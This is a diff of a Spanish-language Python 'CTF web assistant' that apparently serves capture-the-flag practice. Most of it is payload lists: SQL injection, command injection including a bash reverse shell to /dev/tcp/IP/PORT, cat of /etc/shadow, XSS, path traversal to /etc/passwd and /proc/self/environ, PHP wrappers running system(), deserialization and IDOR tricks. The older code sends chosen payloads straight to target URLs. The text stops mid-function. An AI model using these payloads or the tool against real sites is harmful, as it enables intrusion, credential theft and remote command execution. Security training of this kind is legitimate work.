@@ -1,440 +1,529 @@
-# ctfassistant/main.py
+# ctfassistant/main.py - Versión 5.1 (Inyección Masiva)
 # -*- coding: utf-8 -*-
 
-import os
 import sys
 import requests
-from bs4 import BeautifulSoup 
-import urllib.parse # Ya estaba importado implícitamente por requests.utils.quote
+import urllib.parse
+import base64
+import hashlib
+import json
+import binascii
+import re
+from typing import Dict, List, Any
 
-# -----------------------------------------------
-# MÓDULOS DE PAYLOADS
-# -----------------------------------------------
-
-def show_sqli_payloads():
-    """Muestra y explica los payloads de SQLi más comunes."""
-    payloads = {
-        # Payloads Clásicos y para Adivinar el Número de Columnas
-        "1. Pruebas de Citas/Comentarios": ["' --", "') --", "'; --", '") --', '" --", "') or 1=1 --"],
+class CTFAssistant:
+    
+    def __init__(self):
+        self.payloads = self._load_payloads()
         
-        # Pruebas de Bypass de Autenticación
-        "2. Bypass de Login (True Always)": ["' OR 1=1 --", "' OR '1'='1 --", "' OR 'a'='a' --"],
+    def _load_payloads(self) -> Dict[str, Any]:
+        return {
+            "sqli": {
+                "1. Pruebas de Citas/Comentarios (Bypass de Filtros)": [
+                    "' --", "') --", "'; --", '") --', '" --', "') or 1=1 --", 
+                    "' OR '1'='1", "admin' --", 
+                    "admin' or '1'='1'#",
+                    "\\' or 1=1 --",
+                    "admin') union select 1,2,3 --",
+                    "1; SELECT * FROM users; --",
+                    "1' AND 1=1 UNION SELECT null,null,null --",
+                    "1' OR 1=1 -- -",
+                    "1' OR '1' = '1"
+                ],
+                "2. Bypass de Login y Booleanos": [
+                    "admin' OR 1=1#",
+                    "' OR 'a'='a",
+                    "'='",
+                    "' OR 1=1 -- -",
+                    "admin' AND 1=0 UNION SELECT 'admin', 'password'",
+                    "1' XOR 1=1",
+                    "1' or 1=1 limit 1 --",
+                    "1' OR 1 GROUP BY 'a' HAVING 'a'='a"
+                ],
+                "3. Extracción de Datos y Versión (MySQL)": [
+                    " ORDER BY N --",
+                    " UNION SELECT 1,2,3... --",
+                    " UNION SELECT 1, database(), user() --",
+                    " UNION SELECT 1, @@version, 3 --",
+                    " UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata --",
+                    " UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema='NOMBRE_DB' --",
+                    " UNION SELECT 1, group_concat(column_name, 0x3a, table_name), 3 FROM information_schema.columns WHERE table_name='NOMBRE_TABLA' --",
+                    " 1' AND substring(@@version,1,1)='5' -- -",
+                    " 1 AND 1=1 AND 1=1"
+                ],
+                "4. SQLi Tiempos (Time-Based Blind)": [
+                    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1",
+                    "' AND IF(1=1, SLEEP(5), 0) --",
+                    "1 OR (SELECT(CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END))"
+                ]
+            },
+            "command_injection": {
+                "1. Separadores y Encadenamiento Común": ["&", "&&", "|", ";", "\n", "%0a", "%0d", "$()"],
+                "2. Pruebas de Ejecución (Linux)": [
+                    "TARGET; ls -la", "TARGET && cat /etc/passwd", "`whoami`", 
+                    "TARGET%0als -la", "TARGET|/bin/bash -c 'ls /'", 
+                    "TARGET; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1 # (Reverse Shell)",
+                    "TARGET| awk 'BEGIN {system(\"whoami\")}'",
+                    "TARGET%0a cat /etc/shadow",
+                    "$(id)",
+                    "TARGET; export PATH=/usr/bin:$PATH; bash"
+                ],
+                "3. Bypass de Filtros (Strings y Wildcards)": [
+                    "TARGET; echo 'pwned' > pwned.txt",
+                    "TARGET; cat /etc/pass*d",
+                    "TARGET; w'h'o'a'm'i",
+                    "TARGET; /???/??? /???/p?ss?d"
+                ],
+                "4. Pruebas en Windows": [
+                    "TARGET& ping 127.0.0.1",
+                    "TARGET & whoami",
+                    "TARGET | type C:\\Windows\\win.ini"
+                ]
+            },
+            "xss": {
+                "1. Básico y Tags de Imagen/SVG": [
+                    "<script>alert(document.domain)</script>",
+                    "<img src=x onerror=alert(1)>",
+                    "<svg onload=alert(1)>",
+                    "<body onpageshow=alert(1)>",
+                    "<details open ontoggle=alert(1)>",
+                    "<iframe src=javascript:alert(1)></iframe>"
+                ],
+                "2. Bypass de Filtros y Codificación": [
+                    "';alert(1)//", "')alert(1)//", 
+                    "\'\"-alert(1)-\'\"`",
+                    "xss<script>/* no spaces */alert(1)</script>",
+                    "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+                    "<img/src=\"x\"onerror=\"alert(1)\">"
+                ],
+                "3. Event Handlers Avanzados": [
+                    "<a href=\"javascript:alert(1)\">ClickMe</a>",
+                    "<input onfocus=alert(1) autofocus>",
+                    "<video src=x onerror=alert(1)>",
+                    "<isindex action=javascript:alert(1) type=image>",
+                    "<marquee onstart=alert(1)>"
+                ],
+                "4. XSS Reflejado en API/JSON": [
+                    '"}))</script><script>alert(1)</script>',
+                    "';-alert(1)//",
+                    "';}}}</script><svg onload=alert(1)//"
+                ]
+            },
+            "lfi": {
+                "1. Archivos Críticos (Linux)": [
+                    "../../../../../etc/passwd", 
+                    "../../../../../etc/shadow", 
+                    "../../../../../proc/self/environ",
+                    "../../../../../proc/self/cmdline",
+                    "../../../../../var/log/apache2/access.log",
+                    "../../../../../var/log/apache/access.log"
+                ],
+                "2. Wrappers y Encoding Avanzado": [
+                    r"..\..\..\..\windows\system32\drivers\etc\hosts",
+                    "php://filter/read=convert.base64-encode/resource=index.php", 
+                    "php://input",
+                    "data:text/plain,<?php system('id'); ?>",
+                    "....//....//....//....//etc/passwd",
+                    "/etc/passwd%00"
+                ]
+            },
+            "authz": {
+                "1. Controles de Acceso (IDOR)": [
+                    "Cambia id=1 por id=2 o id=admin",
+                    "Modifica user_id de tu cookie/token a user_id:1 (admin)",
+                    "Cambia /api/v1/user/me por /api/v1/user/1"
+                ],
+                "2. Bypass de Lógica/Flujo": [
+                    "Omite un paso de multi-paso (ej: eliminar el parámetro 'step=2')",
+                    "Reenvía la respuesta de la función 'disable_account()' como true/1",
+                    "Fuerza navegación a 'admin.php' directamente."
+                ],
+                "3. Ataques a Sesión (CSRF / Fijación)": [
+                    "Busca tokens CSRF en formularios y reúsalo o elimínalo.",
+                    "Intenta la petición POST/PUT sin el encabezado 'Referer'."
+                ]
+            },
+            "logic_fuzz": {
+                "1. Fuzzing Básico de Parámetros": [
+                    "'", '"', '`', '\\', ';', '|', '&', '>', '<', '*', '..%2f',
+                    '0', '1', '-1', 'true', 'false', 'admin', 'root'
+                ],
+                "2. Headers Fuzzing": [
+                    "X-Forwarded-For: 127.0.0.1",
+                    "X-Original-URL: /admin",
+                    "Referer: https://malicious.com",
+                    "Host: 127.0.0.1"
+                ]
+            },
+            "serialization": {
+                "1. PHP Object Injection (Explotación)": [
+                    'O:7:"MyClass":1:{s:8:"username";s:5:"admin";}',
+                    'a:2:{i:0;s:11:"admin";i:1;s:8:"password";}'
+                ],
+                "2. JSON Deserialization (Payloads clave)": [
+                    '{"$type":"Gadget_Chain, Assembly"}',
+                    '{"username":"admin", "isAdmin":true}',
+                    '{"__proto__": {"isAdmin": true}}'
+                ]
+            }
+        }
+
+    def show_payloads(self, type: str):
+        map_titles = {
+            "sqli": "[📚] PAYLOADS DE SQL INJECTION AVANZADOS [📚]",
+            "command_injection": "[📚] PAYLOADS DE COMMAND INJECTION (LINUX/WINDOWS) [📚]",
+            "xss": "[📚] PAYLOADS DE XSS Y MANIPULACIÓN DE APIs [📚]",
+            "lfi": "[📚] PAYLOADS DE LFI / PATH TRAVERSAL [📚]",
+            "authz": "[📚] PAYLOADS DE AUTORIZACIÓN Y SESIÓN [📚]",
+            "logic_fuzz": "[📚] FUZZING BÁSICO DE LÓGICA Y HEADERS [📚]",
+            "serialization": "[📚] SERIALIZACIÓN Y LÓGICA DE NEGOCIO [📚]"
+        }
         
-        # Pruebas para Adquirir Información (UNION-Based)
-        "3. UNION Básica (Contar Columnas)": [
-            " ORDER BY N -- (Sustituye N por 1, 2, 3... hasta que falle para contar)",
-            " UNION SELECT 1,2,3,4,5 -- (Ejemplo para 5 columnas, ajusta los números)"
-        ],
-    }
-
-    print("\n[📚] PAYLOADS DE SQL INJECTION RECOMENDADOS [📚]")
-    print("--------------------------------------------------")
-    print("💡 **Objetivo:** Copia estos payloads y pégalos en tu parámetro de URL.")
-    print("   Observa la respuesta: ¿Hay error? ¿Cambia el contenido?\n")
-
-    for category, payload_list in payloads.items():
-        print(f"**{category}**")
-        for p in payload_list:
-            print(f"   -> {p}")
-        print("-" * 15)
-
-
-def show_command_payloads():
-    """Muestra los payloads de Command Injection más comunes para Linux."""
-    payloads = {
-        # Separadores Comunes
-        "1. Separadores de Comandos": [
-            "&",         # Ejecuta el comando anterior y luego el nuevo
-            "&&",        # Ejecuta el nuevo SOLO si el anterior fue exitoso
-            "|",         # Pipe: Manda la salida del anterior al nuevo
-            ";"          # Simple separador de comandos
-        ],
+        print(f"\n{map_titles.get(type, '[📚] PAYLOADS [📚]')}")
+        print("-" * 50)
         
-        # Comandos de Prueba (Reemplaza 'TARGET' con '127.0.0.1' o una entrada válida)
-        "2. Inyección Clásica (Ejemplos)": [
-            "TARGET; ls -la",
-            "TARGET && cat /etc/passwd",
-            "`whoami`"  # Backticks (alt-96)
-        ],
-    }
+        for category, payload_list in self.payloads[type].items():
+            print(f"**{category}**")
+            for p in payload_list:
+                print(f"   -> {p}")
+            print("-" * 15)
 
-    print("\n[📚] PAYLOADS DE COMMAND INJECTION (LINUX) [📚]")
-    print("--------------------------------------------------")
-    print("💡 **Objetivo:** Inserta estos payloads en el campo de entrada vulnerable.\n")
+    def tool_sqli(self):
+        print("\n[🛠️] Módulo: SQL Injection (SQLi)")
+        target_url = input("URL objetivo (ej: http://e.com/page.php?id=1): ")
+        self.show_payloads("sqli")
+        input("\n[✅] Análisis de SQLi completado. Presiona ENTER para volver al menú...")
 
-    for category, payload_list in payloads.items():
-        print(f"**{category}**")
-        for p in payload_list:
-            print(f"   -> {p}")
-        print("-" * 15)
+    def tool_command_injection(self):
+        print("\n[🛠️] Módulo: Command Injection")
+        target_url = input("URL objetivo (ej: http://e.com/ping.php?host=127.0.0.1): ")
+        self.show_payloads("command_injection")
+        input("\n[✅] Análisis de Command Injection completado. Presiona ENTER para volver al menú...")
 
-
-def show_xss_payloads():
-    """Muestra los payloads XSS más comunes para diferentes escenarios."""
-    payloads = {
-        # Clásico Reflected XSS (Prueba principal)
-        "1. XSS Básico (Sin Filtros)": [
-            "<script>alert(1)</script>",
-            "<img src=x onerror=alert(1)>",
-            "<svg onload=alert(1)>"
-        ],
+    def tool_xss(self):
+        print("\n[🛠️] Módulo: XSS Payload Generator & Tester")
+        target_url = input("URL objetivo (ej: http://e.com/search.php?q=TEST): ")
+        self.show_payloads("xss")
+        input("\n[✅] Análisis de XSS completado. Presiona ENTER para volver al menú...")
         
-        # Bypass de Filtros Comunes (Si se filtra 'script' o '<')
-        "2. Bypass de Etiquetas/Comillas": [
-            "';alert(1)//", # Cerrar comillas simples y comentar
-            "')alert(1)//", # Cerrar comillas dobles y paréntesis
-            "<a onmouseover=alert(1)>XSS</a>" # Usar eventos de ratón
-        ],
+    def tool_lfi(self):
+        print("\n[🛠️] Módulo: LFI / Path Traversal (Ing. Inversa)")
+        target_url = input("URL objetivo (ej: http://e.com/page.php?file=index.php): ")
+        self.show_payloads("lfi")
+        input("\n[✅] Análisis de LFI completado. Presiona ENTER para volver al menú...")
+
+    def tool_authz(self):
+        print("\n[🛠️] Módulo: Autenticación, Autorización y Sesiones")
+        print("--------------------------------------------------")
+        print("💡 **Objetivo:** Enfócate en cambiar parámetros de usuario y roles en peticiones.")
         
-        # Bypass de 'alert' (Si se filtra la palabra 'alert')
-        "3. Bypass de Funciones (Ej: 'alert' filtrado)": [
-            "<img src=x onerror=window.onload=function(){eval(atob('YWxlcnQoMSk='))}>" # Codificación Base64
-        ],
-    }
-
-    print("\n[📚] PAYLOADS DE XSS RECOMENDADOS [📚]")
-    print("------------------------------------------")
-    print("💡 **Objetivo:** Inyecta estos payloads y busca la reflexión en el HTML.")
-    print("   El éxito se verifica si el payload inyectado aparece en la respuesta.\n")
-
-    for category, payload_list in payloads.items():
-        print(f"**{category}**")
-        for p in payload_list:
-            print(f"   -> {p}")
-        print("-" * 15)
-
-def show_lfi_payloads():
-    """Muestra los payloads de LFI/Path Traversal más comunes."""
-    payloads = {
-        # Payloads para Linux (el más común)
-        "1. Archivo Objetivo: /etc/passwd": [
-            "../../../../../etc/passwd", 
-            "....//....//....//....//etc/passwd", # Doble URL Encoding Bypass
-            "/etc/passwd%00" # Null Byte (antiguamente útil para terminar la cadena)
-        ],
+        self.show_payloads("authz")
         
-        # Payloads para Windows (menos común en CTF web)
-        "2. Archivo Objetivo: Windows System": [
-            "..\..\..\..\windows\system32\drivers\etc\hosts",
-            "%c0%ae%c0%ae/%c0%ae%c0%ae/windows/system32/drivers/etc/hosts" # Unicode Encoding
-        ],
-
-        # Wrapper (Si solo acepta archivos locales)
-        "3. PHP Filter Wrapper": [
-            "php://filter/read=convert.base64-encode/resource=index.php" # Leer el código fuente de index.php
-        ]
-    }
-
-    print("\n[📚] PAYLOADS DE LFI / PATH TRAVERSAL [📚]")
-    print("------------------------------------------")
-    print("💡 **Objetivo:** Tratar de leer archivos del sistema (ej: /etc/passwd).\n")
-
-    for category, payload_list in payloads.items():
-        print(f"**{category}**")
-        for p in payload_list:
-            print(f"   -> {p}")
-        print("-" * 15)
-
-
-# -----------------------------------------------
-# MÓDULOS DE HERRAMIENTAS
-# -----------------------------------------------
-
-def tool_sqli():
-    """Herramienta principal de SQL Injection."""
-    print("\n[🛠️] Módulo: SQL Injection (SQLi)")
-    print("---------------------------------")
-    
-    target_url = input("Ingresa la URL objetivo (ej: http://ejemplo.com/pagina.php?id=1): ")
-    
-    if "=" not in target_url:
-        print("⚠️ Advertencia: La URL no parece tener un parámetro (ej: ?id=1).")
-        input("Presiona ENTER para continuar y ver los Payloads...")
+        print("\n[🔍] Puntos Clave para Ataques a Sesión/Autorización:")
+        print("  - **IDOR:** Busca cambiar ID's en URL, JSON o Parámetros.")
+        print("  - **CSRF:** Examina si la petición POST/PUT requiere un token secreto. Si no lo requiere, es vulnerable.")
+        print("  - **Escalada:** Intenta cambiar el valor de tu rol ('user' a 'admin') en cookies o payloads de POST/JSON.")
         
-    print(f"\n[🔗] URL Objetivo: {target_url}")
-    print("---------------------------------")
+        input("\n[✅] Análisis de Autorización/Sesiones completado. Presiona ENTER para volver al menú...")
 
-    show_sqli_payloads()
-    
-    try_payload = input("\n¿Quieres probar un payload inmediatamente? (S/N): ").strip().upper()
-
-    if try_payload == 'S':
-        payload = input("Ingresa el payload que quieres probar (ej: ' OR 1=1 --): ")
-        
-        if '=' in target_url:
-            # Usar urllib.parse.urljoin para manejar la ruta base y el payload, aunque
-            # para payloads inyectados al final de un parámetro, la concatenación simple es común.
-            base_url, _ = target_url.rsplit('=', 1)
-            full_url = f"{base_url}{payload}" # Concatenamos directamente
-            
-            print(f"\n[🚀] Probando URL: {full_url}")
-            
-            try:
-                response = requests.get(full_url, timeout=10)
-                
-                print(f"[*] Código de Estado HTTP: {response.status_code}")
-                
-                if response.status_code != 200:
-                    print("🚨 Alerta: El Código de Estado NO es 200 (OK). Podría indicar un error.")
-                
-                print("\n[🔍] Primeras 20 líneas de la Respuesta del Servidor:")
-                content_lines = response.text.splitlines()
-                for line in content_lines[:20]:
-                    print(line.strip()[:100])
-                    
-            except requests.exceptions.RequestException as e:
-                print(f"❌ Error al conectar con la URL: {e}")
-                
-        else:
-            print("❌ No se pudo insertar el payload automáticamente. Por favor, hazlo manualmente.")
-
-    print("\n[✅] Análisis de SQLi completado. ¡Usa los resultados para el siguiente paso!")
-    input("\nPresiona ENTER para volver al menú de Inyección...")
-
-
-def tool_command_injection():
-    """Herramienta principal de Command Injection."""
-    print("\n[🛠️] Módulo: Command Injection")
-    print("-------------------------------")
-    
-    target_url = input("Ingresa la URL objetivo (ej: http://ejemplo.com/ping.php?host=127.0.0.1): ")
-    
-    if "=" not in target_url:
-        print("⚠️ Advertencia: La URL no parece tener un parámetro de entrada.")
-        input("Presiona ENTER para continuar y ver los Payloads...")
-
-    print(f"\n[🔗] URL Objetivo: {target_url}")
-    print("---------------------------------")
-    
-    show_command_payloads()
-    
-    try_payload = input("\n¿Quieres probar un payload inmediatamente? (S/N): ").strip().upper()
-    
-    if try_payload == 'S':
-        payload = input("Ingresa el payload COMPLETO a enviar (ej: 127.0.0.1; whoami): ")
-        
-        if '=' in target_url:
-            base_url, _ = target_url.rsplit('=', 1)
-            full_url = f"{base_url}={urllib.parse.quote(payload)}" # Codificamos el payload para la URL
-            
-            print(f"\n[🚀] Probando URL: {full_url}")
-            
-            try:
-                response = requests.get(full_url, timeout=10)
-                
-                print(f"[*] Código de Estado HTTP: {response.status_code}")
-                
-                print("\n[🔍] Primeras 20 líneas de la Respuesta del Servidor:")
-                content_lines = response.text.splitlines()
-                for line in content_lines[:20]:
-                    print(line.strip()[:100])
-                    
-            except requests.exceptions.RequestException as e:
-                print(f"❌ Error al conectar con la URL: {e}")
-                
-        else:
-            print("❌ No se pudo insertar el payload automáticamente. Por favor, hazlo manualmente.")
-
-    print("\n[✅] Análisis de Command Injection completado. ¡Busca la salida de tu comando!")
-    input("\nPresiona ENTER para volver al menú de Inyección...")
-
-
-def tool_xss():
-    """Herramienta principal para XSS Payload Generator & Tester."""
-    print("\n[🛠️] Módulo: XSS Payload Generator & Tester")
-    print("------------------------------------------")
-    
-    # 1. Recolección de Datos
-    target_url = input("Ingresa la URL objetivo con el parámetro (ej: http://ejemplo.com/search.php?q=TEST): ")
-    
-    if "=" not in target_url:
-        print("⚠️ Advertencia: La URL no parece tener un parámetro de entrada.")
-        input("Presiona ENTER para continuar y ver los Payloads...")
-
-    print(f"\n[🔗] URL Objetivo: {target_url}")
-    print("---------------------------------")
-    
-    show_xss_payloads()
-    
-    # 2. Prueba rápida del payload
-    try_payload = input("\n¿Quieres probar un payload inmediatamente? (S/N): ").strip().upper()
-    
-    if try_payload == 'S':
-        # Usaremos un payload de prueba simple y codificado para URL
-        test_payload_raw = "XSS_TEST_MARKER" # Marcador simple para búsqueda
-        
-        if '?' in target_url and '=' in target_url:
-            # Dividir la URL y usar el marcador
-            base_url, _ = target_url.rsplit('=', 1)
-            # Codificar el payload para que pase en la URL sin romper la petición
-            test_payload_encoded = urllib.parse.quote(test_payload_raw)
-            full_url = f"{base_url}={test_payload_encoded}"
-            
-            print(f"\n[🚀] Probando URL: {full_url}")
-            
-            try:
-                response = requests.get(full_url, timeout=10)
-                
-                print(f"[*] Código de Estado HTTP: {response.status_code}")
-                
-                # 3. Análisis de la Respuesta
-                # Buscamos el marcador en el texto plano de la respuesta
-                if test_payload_raw in response.text:
-                    print("\n[✅] ¡ÉXITO! El marcador de prueba (XSS_TEST_MARKER) fue reflejado en la página.")
-                    print("   Ahora puedes intentar inyectar tus payloads de XSS.")
-                    
-                    # Intentar mostrar dónde se reflejó (una pequeña porción)
-                    start_index = response.text.find(test_payload_raw)
-                    if start_index != -1:
-                        # Muestra 30 caracteres antes y 30 después
-                        context = response.text[max(0, start_index - 30): start_index + len(test_payload_raw) + 30]
-                        print("\n[🔍] Contexto de Reflexión (Buscando la etiqueta):")
-                        print("--------------------------------------------------")
-                        print(context.strip())
-                else:
-                    print("\n[❌] FALLO. El marcador de prueba NO fue encontrado en la respuesta.")
-                    print("   El parámetro podría no ser vulnerable a XSS reflejado.")
-                    
-            except requests.exceptions.RequestException as e:
-                print(f"❌ Error al conectar con la URL: {e}")
-                
-        else:
-            print("❌ La URL debe contener un parámetro (ej: ?q=valor) para la prueba automática.")
-
-    print("\n[✅] Análisis de XSS completado. ¡A inyectar los payloads! 💉")
-    input("\nPresiona ENTER para volver al Menú Principal...")
-
-
-def tool_lfi():
-    """Herramienta para Local File Inclusion (LFI) / Path Traversal."""
-    print("\n[🛠️] Módulo: LFI / Path Traversal")
-    print("---------------------------------")
-    
-    # 1. Recolección de Datos
-    target_url = input("Ingresa la URL objetivo con el parámetro (ej: http://ejemplo.com/page.php?file=index.php): ")
-    
-    if "=" not in target_url:
-        print("⚠️ Advertencia: La URL no parece tener un parámetro de entrada.")
-        input("Presiona ENTER para continuar y ver los Payloads...")
-
-    print(f"\n[🔗] URL Objetivo: {target_url}")
-    print("---------------------------------")
-    
-    show_lfi_payloads()
-    
-    # 2. Prueba de /etc/passwd
-    try_payload = input("\n¿Quieres probar el payload CLÁSICO de /etc/passwd? (S/N): ").strip().upper()
-    
-    if try_payload == 'S':
-        # Payload clásico de 6 niveles para salir de la estructura del servidor
-        test_payload_raw = "../../../../etc/passwd" 
-        
-        if '?' in target_url and '=' in target_url:
-            # Dividir la URL
-            base_url, _ = target_url.rsplit('=', 1)
-            # Codificar el payload (esto cambia los slashes)
-            test_payload_encoded = urllib.parse.quote(test_payload_raw)
-            full_url = f"{base_url}={test_payload_encoded}"
-            
-            print(f"\n[🚀] Probando URL: {full_url}")
-            
-            try:
-                response = requests.get(full_url, timeout=10)
-                
-                print(f"[*] Código de Estado HTTP: {response.status_code}")
-                
-                # 3. Análisis de la Respuesta
-                # Buscamos la estructura del archivo /etc/passwd
-                if "root:" in response.text or "daemon:" in response.text:
-                    print("\n[✅] ¡VULNERABILIDAD CONFIRMADA! La página muestra el contenido de /etc/passwd.")
-                    print("   ¡Ahora puedes leer otros archivos importantes del sistema!")
-                    
-                    print("\n[🔍] Contenido de /etc/passwd (Primeras 5 líneas):")
-                    passwd_lines = [line for line in response.text.splitlines() if ':' in line and len(line) > 10]
-                    for line in passwd_lines[:5]:
-                         print(line.strip()[:100])
-                else:
-                    print("\n[❌] FALLO. El contenido de /etc/passwd NO fue encontrado.")
-                    print("   Intenta codificar el payload de forma diferente o cambiar el archivo objetivo.")
-                    
-            except requests.exceptions.RequestException as e:
-                print(f"❌ Error al conectar con la URL: {e}")
-                
-        else:
-            print("❌ La URL debe contener un parámetro (ej: ?file=) para la prueba automática.")
-
-    print("\n[✅] Análisis de LFI completado. ¡A buscar archivos!")
-    input("\nPresiona ENTER para volver al Menú Principal...")
-
-
-# -----------------------------------------------
-# MENÚS Y LÓGICA PRINCIPAL
-# -----------------------------------------------
-
-def show_injection_menu():
-    """Muestra el submenú para las herramientas de Inyección."""
-    while True:
-        # os.system('clear') # Limpia la pantalla, útil en Kali <--- COMENTADO PARA COMPATIBILIDAD
-        print("╔══════════════════════════════════════════╗")
-        print("║        [1] MENÚ DE INYECCIÓN             ║")
-        print("╠══════════════════════════════════════════╣")
-        print("║ 1. SQL Injection (SQLi) Tool             ║")
-        print("║ 2. Command Injection Tool                ║")
-        print("║ 9. Volver al Menú Principal              ║")
-        print("╚══════════════════════════════════════════╝")
-        
-        choice = input("Selecciona una opción o (Ctrl+C para salir): ")
-        
-        if choice == '1':
-            tool_sqli()
-        elif choice == '2':
-            tool_command_injection()
-        elif choice == '9':
-            break
-        else:
-            print("Opción no válida. Inténtalo de nuevo.")
-            
-def main_menu():
-    """Muestra el menú principal de la herramienta."""
-    while True:
-        try:
-            # os.system('clear') # Limpia la pantalla <--- COMENTADO PARA COMPATIBILIDAD
-            print("╔══════════════════════════════════════════╗")
-            print("║     [🔥] CTF WEB ASSISTANT [🔥]          ║")
+    def tool_logic_analysis(self):
+        while True:
+            print("\n╔══════════════════════════════════════════╗")
+            print("║ [4.1] LÓGICA DE NEGOCIO Y SERIALIZACIÓN  ║")
             print("╠══════════════════════════════════════════╣")
-            print("║ 1. Inyección (SQLi, Command Injection)   ║")
-            print("║ 2. Cross-Site Scripting (XSS)            ║")
-            print("║ 3. Análisis de Archivos (LFI/Traversal)  ║")
-            print("║ 4. Salir (Ctrl+C también funciona)       ║")
+            print("║ 1. Payloads de Serialización (PHP, JSON) ║")
+            print("║ 2. Fuzzing Básico (Parámetros/Headers)   ║")
+            print("║ 9. Volver al Menú Principal              ║")
             print("╚══════════════════════════════════════════╝")
             
             choice = input("Selecciona una opción: ")
             
             if choice == '1':
-                show_injection_menu()
+                self.show_payloads("serialization")
+                print("\n💡 **Punto Clave:** Estos payloads se inyectan en cookies, parámetros de POST o archivos que se serializan/deserializan.")
+                input("\n[✅] Análisis de Serialización completado. Presiona ENTER para continuar...")
             elif choice == '2':
-                tool_xss()
-            elif choice == '3':
-                tool_lfi() # Llama a la función tool_lfi
-            elif choice == '4':
-                print("\n¡Éxito en tus retos! ¡Hasta pronto! 👋")
-                sys.exit(0)
+                self.show_payloads("logic_fuzz")
+                print("\n💡 **Punto Clave:** Prueba estos valores en todos los parámetros, incluyendo los ocultos, cookies y encabezados HTTP.")
+                input("\n[✅] Análisis de Fuzzing completado. Presiona ENTER para continuar...")
+            elif choice == '9':
+                break
             else:
                 print("Opción no válida. Inténtalo de nuevo.")
 
-        except KeyboardInterrupt:
-            # Maneja la salida con Ctrl+C
-            print("\n\n¡Herramienta finalizada! ¡Buena suerte! 🚀")
-            sys.exit(0)
+
+    def tool_crypto_analysis(self):
+        while True:
+            print("\n╔══════════════════════════════════════════╗")
+            print("║   [3.2] MENÚ DE CRIPTOGRAFÍA AVANZADA    ║")
+            print("╠══════════════════════════════════════════╣")
+            print("║ 1. Analizador de Cadenas (Base64, Hex, JWT)║")
+            print("║ 2. Generador de Bloques (Padding Oracle) ║")
+            print("║ 9. Volver al Menú Anterior               ║")
+            print("╚══════════════════════════════════════════╝")
             
-        except Exception as e:
-            # Quitamos el print de error para evitar el error de codificación si falla
-            print(f"\nOcurrió un error inesperado (Detalles: {e}).") 
-            input("Presiona ENTER para volver al menú...")
+            choice = input("Selecciona una opción: ")
+            
+            if choice == '1':
+                self._analyzer_crypto_string()
+            elif choice == '2':
+                self._tool_padding_generator()
+            elif choice == '9':
+                break
+            else:
+                print("Opción no válida. Inténtalo de nuevo.")
+
+
+    def _analyzer_crypto_string(self):
+        print("\n[🛠️] Analizador de Cadenas (Codificación y Hashing)")
+        print("-----------------------------------------------------")
+        data = input("Ingresa la cadena a analizar (Ej: Hex, Base64, JWT): ").strip()
+
+        if not data:
+            print("❌ Entrada vacía.")
+            return
+
+        print("\n[🔍] Resultados de Análisis:")
+        
+        if data.count('.') == 2:
+            print("=" * 50)
+            print("[🔑] Token JWT Detectado:")
+            try:
+                header_b64, payload_b64, signature = data.split('.')
+                
+                header_json = base64.urlsafe_b64decode(header_b64 + '==').decode('utf-8', errors='ignore')
+                payload_json = base64.urlsafe_b64decode(payload_b64 + '==').decode('utf-8', errors='ignore')
+                
+                print(f"   -> HEADER: {json.dumps(json.loads(header_json), indent=2)}")
+                print(f"   -> PAYLOAD: {json.dumps(json.loads(payload_json), indent=2)}")
+                print(f"   -> FIRMA: {signature}")
+                print("\n   💡 **Ataques JWT Clave:** 1. Cambiar 'alg' a 'none'. 2. Modificar el PAYLOAD.")
+            except Exception:
+                print(f"   ❌ No es un JWT decodificable.")
+            print("=" * 50)
+        
+        try:
+            decoded_b64 = base64.b64decode(data).decode('utf-8', errors='ignore')
+            if len(data) > 10 and len(decoded_b64) < len(data) * 0.9:
+                 print(f"[*] Base64 Decodificado: {decoded_b64[:100]}{'...' if len(decoded_b64) > 100 else ''}")
+        except:
+            pass
+            
+        decoded_url = urllib.parse.unquote(data)
+        if decoded_url != data:
+            print(f"[*] URL Decodificado: {decoded_url}")
+
+        if all(c in '0123456789abcdefABCDEF' for c in data) and len(data) % 2 == 0:
+             try:
+                decoded_hex = binascii.unhexlify(data).decode('utf-8', errors='ignore')
+                print(f"[*] Hex Decodificado: {decoded_hex[:100]}{'...' if len(decoded_hex) > 100 else ''}")
+             except binascii.Error:
+                 pass
+        
+        try:
+            decoded_b85 = base64.a85decode(data.encode('ascii')).decode('utf-8', errors='ignore')
+            if len(data) > 10 and len(decoded_b85) < len(data) * 0.9:
+                 print(f"[*] Base85 Decodificado: {decoded_b85[:100]}{'...' if len(decoded_b85) > 100 else ''}")
+        except:
+             pass
+
+        print("\n[🔐] Hashing:")
+        print(f"   -> MD5: {hashlib.md5(data.encode()).hexdigest()}")
+        print(f"   -> SHA256: {hashlib.sha256(data.encode()).hexdigest()}")
+        
+        input("\n[✅] Análisis completado. Presiona ENTER para continuar...")
+
+    def _tool_padding_generator(self):
+        print("\n[🛠️] Generador de Bloques (Padding Oracle - AES-CBC)")
+        print("-------------------------------------------------------")
+        
+        ciphertext = input("Ingresa el Ciphertext (en Hex) o Base64: ").strip()
+        block_size_str = input("Ingresa el tamaño del bloque (Típicamente 16 para AES): ").strip()
+        
+        try:
+            block_size = int(block_size_str)
+        except ValueError:
+            print("❌ El tamaño del bloque debe ser un número entero.")
+            return
+
+        try:
+            if all(c in '0123456789abcdefABCDEF' for c in ciphertext) and len(ciphertext) % 2 == 0:
+                cipher_bytes = binascii.unhexlify(ciphertext)
+            else:
+                cipher_bytes = base64.b64decode(ciphertext)
+        except Exception:
+            print("❌ Error al decodificar: Ingresa Hex o Base64 válido.")
+            return
+
+        print(f"\n[🔍] Análisis de Bloques (Tamaño: {block_size} bytes):")
+        
+        if len(cipher_bytes) % block_size != 0:
+            print(f"⚠️ Advertencia: El tamaño de los datos ({len(cipher_bytes)} bytes) no es un múltiplo del tamaño del bloque ({block_size} bytes).")
+            return
+            
+        blocks = [cipher_bytes[i:i + block_size] for i in range(0, len(cipher_bytes), block_size)]
+
+        print(f"[*] Número de Bloques Detectados: {len(blocks)}")
+        
+        for i, block in enumerate(blocks):
+            print(f"   -> Bloque {i}: {block.hex()} (Tamaño: {len(block)})")
+
+        if len(blocks) >= 2:
+            print("\n[💡] **Para Ataques Padding Oracle (AES-CBC):**")
+            print("   - El primer bloque es el **IV (Vector de Inicialización)**.")
